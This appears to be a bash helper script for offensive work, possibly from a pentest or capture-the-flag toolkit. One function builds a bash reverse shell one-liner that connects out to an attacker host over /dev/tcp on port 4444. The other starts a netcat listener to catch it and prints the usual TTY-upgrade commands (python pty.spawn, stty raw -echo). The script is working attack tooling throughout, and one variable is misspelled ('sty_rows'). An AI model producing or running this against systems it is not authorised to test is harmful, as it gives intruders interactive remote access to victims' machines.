#!/bin/bash

get_bash_reverse_shell() {
    if [ -z "$host_port" ]; then
        host_port=4444  # Default reverse shell port
    fi
    if [ -z "$host_ip" ]; then
        host_ip=$(get_host_ip)  # Function to get the host IP address
    fi
    reverse_shell='bash -c "bash -i >& /dev/tcp/'"$host_ip"'/'"$host_port"' 0>&1"'
    echo "$reverse_shell"
}



start_listener() {
    if [ -z "$host_port" ]; then
        host_port=4444  # Default reverse shell port
    fi
    if [ -z "$trail_log" ]; then
        trail_log="trail.log"
    fi
    stty_size=$(stty size)
    terminal_type=$(echo $TERM)
    stty_rows=$(echo "$stty_size" | awk '{print $1}')
    stty_columns=$(echo "$stty_size" | awk '{print $2}')
    echo "stty rows: $sty_rows, columns: $stty_columns"
    echo "terminal type: $terminal_type"
    echo "Starting listener on port $host_port..."
    echo "/bin/sh -i"
    echo "/usr/bin/script -qc /bin/bash /dev/null"
    echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    echo "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'"
    echo "Ctrl-Z"
    echo "stty -a"
    echo "stty raw -echo; fg"
    echo "export TERM=$terminal_type; export SHELL=bash; stty rows $stty_rows columns $stty_columns; reset"
    nc -lvnp "$host_port" 2>&1 | tee -a $trail_log
}
